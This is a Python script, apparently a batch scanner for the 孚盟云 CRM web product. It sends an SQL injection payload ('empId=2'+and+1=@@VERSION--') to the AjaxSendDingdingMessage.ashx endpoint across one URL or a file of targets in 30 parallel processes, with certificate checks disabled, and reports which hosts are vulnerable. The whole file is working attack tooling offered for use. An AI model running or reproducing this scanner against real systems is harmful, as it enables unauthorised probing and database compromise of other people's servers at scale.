import requests
import argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def main():
    banner = """
          _____                    _____                _____                    _____                    _____          
         /\    \                  /\    \              |\    \                  /\    \                  /\    \         
        /::\    \                /::\____\             |:\____\                /::\____\                /::\____\        
       /::::\    \              /:::/    /             |::|   |               /:::/    /               /::::|   |        
      /::::::\    \            /:::/    /              |::|   |              /:::/    /               /:::::|   |        
     /:::/\:::\    \          /:::/    /               |::|   |             /:::/    /               /::::::|   |        
    /:::/__\:::\    \        /:::/    /                |::|   |            /:::/    /               /:::/|::|   |        
   /::::\   \:::\    \      /:::/    /                 |::|   |           /:::/    /               /:::/ |::|   |        
  /::::::\   \:::\    \    /:::/    /      _____       |::|___|______    /:::/    /      _____    /:::/  |::|   | _____  
 /:::/\:::\   \:::\    \  /:::/____/      /\    \      /::::::::\    \  /:::/____/      /\    \  /:::/   |::|   |/\    \ 
/:::/  \:::\   \:::\____\|:::|    /      /::\____\    /::::::::::\____\|:::|    /      /::\____\/:: /    |::|   /::\____\
\::/    \:::\   \::/    /|:::|____\     /:::/    /   /:::/~~~~/~~      |:::|____\     /:::/    /\::/    /|::|  /:::/    /
 \/____/ \:::\   \/____/  \:::\    \   /:::/    /   /:::/    /          \:::\    \   /:::/    /  \/____/ |::| /:::/    / 
          \:::\    \       \:::\    \ /:::/    /   /:::/    /            \:::\    \ /:::/    /           |::|/:::/    /  
           \:::\____\       \:::\    /:::/    /   /:::/    /              \:::\    /:::/    /            |::::::/    /   
            \::/    /        \:::\__/:::/    /    \::/    /                \:::\__/:::/    /             |:::::/    /    
             \/____/          \::::::::/    /      \/____/                  \::::::::/    /              |::::/    /     
                               \::::::/    /                                 \::::::/    /               /:::/    /      
                                \::::/    /                                   \::::/    /               /:::/    /       
                                 \::/____/                                     \::/____/                \::/    /        
                                  ~~                                            ~~                       \/____/         
                                                                                                                         
"""
    print(banner)
    parser = argparse.ArgumentParser(description='孚盟云')
    parser.add_argument('-u','--url', type=str, help='输入要检测URL')
    parser.add_argument('-f','--file', type=str, help='输入要批量检测的文本')
    args = parser.parse_args()
    url = args.url
    file = args.file
    targets = []
    if url:
        check(args.url)
    elif file:
        f = open(file, 'r')
        for i in f.readlines():
            i = i.strip()
            if 'http' in i:
                targets.append(i)
            else:
                i = f"http://{i}"
                targets.append(i)
    pool = Pool(30)
    pool.map(check, targets)
    pool.close()
def check(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0'
    }
    data = '''action=SendDingMeg_Mail&empId=2'+and+1=@@VERSION--+
    '''
    try:
        response = requests.get(f'{target}/m/Dingding/Ajax/AjaxSendDingdingMessage.ashx',headers=headers,data=data,verify=False,timeout=5)
        if response.status_code == 200 and 'Status' in response.text:
            print(f"[!]{target}存在漏洞")
        else:
            print(f"[*]{target}不存在漏洞")
    except Exception as e:
        pass
if __name__ == '__main__':
    main()